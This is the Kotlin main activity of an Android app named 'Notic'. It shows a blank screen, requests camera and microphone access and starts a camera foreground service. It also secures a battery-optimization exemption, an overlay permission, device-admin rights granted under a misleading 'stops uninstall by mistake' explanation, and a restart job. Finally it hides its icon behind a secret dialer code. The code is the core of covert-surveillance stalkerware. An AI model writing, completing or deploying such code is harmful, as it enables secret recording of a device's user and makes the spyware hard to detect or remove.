package com.example.notic

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View

// Notic: blank screen, no controls. Asks permissions once, then runs by itself (also after restarts).
class MainActivity : Activity() {
    private var askedBattery = false
    private var askedOverlay = false
    private var askedAdmin = false
    private var hidden = false

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        setContentView(View(this).apply { setBackgroundColor(0xFFFFFFFF.toInt()) })
        ReviveJob.schedule(this)
        val p = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS)
        requestPermissions(p.toTypedArray(), 1)
    }

    private fun granted() =
        checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
        checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, r: IntArray) {
        if (granted()) startForegroundService(
            Intent(this, CameraService::class.java).putExtra("camera", true))
    }

    // After each prompt closes, this runs again and asks for the next one (each once per launch)
    override fun onResume() {
        super.onResume()
        if (!granted()) return
        val pm = getSystemService(PowerManager::class.java)
        if (!askedBattery && !pm.isIgnoringBatteryOptimizations(packageName)) {
            askedBattery = true
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")))
            return
        }
        if (!askedOverlay && !Settings.canDrawOverlays(this)) {
            askedOverlay = true
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")))
            return
        }
        val dpm = getSystemService(DevicePolicyManager::class.java)
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (!askedAdmin && !dpm.isAdminActive(admin)) {
            askedAdmin = true
            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Stops Notic from being uninstalled by mistake."))
            return
        }
        // Every step is done: remove the icon. Dial *#*#8428#*#* to bring it back.
        if (!hidden) { hidden = true; hideIcon(this) }
    }
}
